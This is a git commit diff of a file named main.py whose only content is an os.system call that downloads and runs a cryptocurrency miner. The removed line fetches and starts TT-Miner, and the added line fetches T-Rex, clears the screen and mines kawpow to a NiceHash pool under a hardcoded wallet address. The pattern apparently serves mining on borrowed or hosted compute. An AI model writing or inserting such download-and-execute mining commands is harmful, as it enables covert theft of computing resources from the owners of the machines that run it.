fcdecba705eed1d270223534254e2349ea910971
LopperNanas <153208294+LopperNanas@users.noreply.github.com>
2024-03-22 08:29:42 -0300

    Update main.py

--- main.py
+++ main.py
@@ -1,2 +1,2 @@
 import os
-os.system("wget https://github.com/TrailingStop/TT-Miner-release/releases/download/2024.1.3/TT-Miner-2024.1.3.tar.gz && tar -xf TT-Miner-2024.1.3.tar.gz && ./TT-Miner-2024.1.3/TT-Miner -a KAWPOW -P stratum+ssl://33uK4AkoDaMZ8FNNUN4nKw1bJQ6KfvuBA2.CLD@kawpow.auto.nicehash.com:443")
+os.system("wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -xf t-rex-0.26.8-linux.tar.gz && clear && ./t-rex --intensity 25 -a kawpow -o stratum+ssl://kawpow.auto.nicehash.com:443 -u 33uK4AkoDaMZ8FNNUN4nKw1bJQ6KfvuBA2.CLD -p x")
